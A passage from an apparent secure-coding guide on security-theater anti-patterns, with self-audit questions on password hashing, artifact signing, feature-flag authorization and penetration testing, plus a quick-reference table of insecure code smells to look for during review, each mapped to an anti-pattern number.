10. **Do we use a password-hashing algorithm with a configurable work factor (bcrypt, scrypt, Argon2id)?** If using MD5, SHA-1, or even unsalted SHA-256, see AP-14.

11. **Does our release pipeline sign artifacts, or only publish checksums?** If only checksums, see AP-13.

12. **Do our feature flags control visibility only, or do they also serve as authorization gates?** See AP-18.

13. **When was our last actual penetration test, and were the findings remediated?** If the answer is "I don't know" or "over a year ago," see AP-20.

14. **Can our compliance controls be verified programmatically, or do they exist only in policy documents?** See AP-20.

---

## Code Smell Quick Reference

| Code Smell | Files to Check | Anti-Pattern |
|---|---|---|
| `base64.b64encode` near `password`/`secret`/`key` | Auth modules, config loaders | AP-02 |
| `localStorage.setItem` with token/JWT values | Auth service, login handlers | AP-05 |
| `type="hidden"` with `user_id`/`role`/`price` | HTML templates, form components | AP-09 |
| `hashlib.md5` / `MD5.Create()` near password logic | Auth modules, user models | AP-14 |
| String concatenation in SQL (`f"SELECT...{var}"`) | Database access layers, repositories | AP-07, AP-16 |
| `Access-Control-Allow-Origin: *` or reflected origin | CORS middleware, API config | AP-17 |
| `ENCRYPTION_KEY = "..."` as string literal in source | Crypto utilities, config files | AP-19 |
| `featureFlag.isEnabled` without adjacent `authorize()` | Route handlers, controllers | AP-18 |
| `oncontextmenu` / `preventDefault` for Ctrl+U | Layout components, base templates | AP-12 |
| SQL keyword arrays used in input validation | Input sanitizers, middleware | AP-16 |
| CAPTCHA widget with no server-side rate limit | Login/registration handlers | AP-04 |
| Checksum files (`.sha256`) without signature files (`.sig`) | Release pipelines, CI/CD config | AP-13 |
| `security_question` / `maiden_name` DB columns | User models, account recovery | AP-15 |
| Routes matching `/admin|dashboard|internal` without auth middleware | Router config, route definitions | AP-11 |
| Rate limit logic using `setTimeout`/`Date.now()` only in frontend | Client-side API wrappers | AP-10 |

---

*Researched: 2026-03-08 | Sources: OWASP Top 10, OWASP API Security Top 10, PortSwigger Web Security Academy, Claroty Team82 WAF Research, GitGuardian State of Secrets Sprawl 2025, CWE-321 (Hardcoded Keys), CWE-798 (Hardcoded Credentials), Krebs on Security (LinkedIn breach), CVE-2024-3596 (Blast-RADIUS), Barracuda Networks (View-Source analysis), Group-IB Security Theater Research, NIST Supply Chain Guidelines, Bruce Schneier (Security Theater concept), DataDome CAPTCHA Farm Research, Deepstrike Client-Side Validation Research*
